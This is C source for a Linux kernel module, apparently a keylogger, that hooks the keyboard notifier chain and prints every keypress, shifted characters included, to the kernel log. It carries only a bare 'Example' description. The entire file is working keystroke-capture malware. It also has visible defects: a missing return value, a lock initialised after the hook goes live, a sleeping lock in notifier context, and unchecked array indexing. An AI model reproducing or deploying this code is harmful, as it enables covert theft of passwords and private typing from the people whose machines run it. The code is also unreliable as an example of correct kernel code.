/*
 * =====================================================================================
 *
 *       Filename:  kl.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  30/10/14 09:14:18
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
struct semaphore sem;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
  "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
  "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
  "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
  "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
  "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
  "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
  "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
  "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymapShiftActivated[] =
{ "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
  "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
  "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
  "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
  "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
  "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
  "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
  "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int shiftKeyDepressed = 0;

int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;
  int ret = NOTIFY_OK;
  if(code == KBD_KEYCODE) {
    if( param->value==42 || param->value==54 )
    {
      //acquire lock to modify the global variable shiftKeyDepressed
      down(&sem);
      if(param->down)
        shiftKeyDepressed = 1;
      else
        shiftKeyDepressed = 0;
      up(&sem);
      return NOTIFY_OK;
    }

    if(param->down)
    {
      //acquire lock to read the global variable shiftKeyDepressed
      down(&sem);
      if(shiftKeyDepressed == 0)
        printk(KERN_INFO "%s \n", keymap[param->value]);
      else
        printk(KERN_INFO "%s \n", keymapShiftActivated[param->value]);
      up(&sem);
    }


  }
}
static struct notifier_block nb = {
  .notifier_call = notify_intercept
};

static int __init kl_init(void) {
  register_keyboard_notifier(&nb);
  sema_init(&sem,1);
  return 0;
}
static void __exit kl_exit(void) {
  unregister_keyboard_notifier(&nb);
}
module_init(kl_init);
module_exit(kl_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Jones <jonesax@hush.com>");
MODULE_DESCRIPTION("Example");
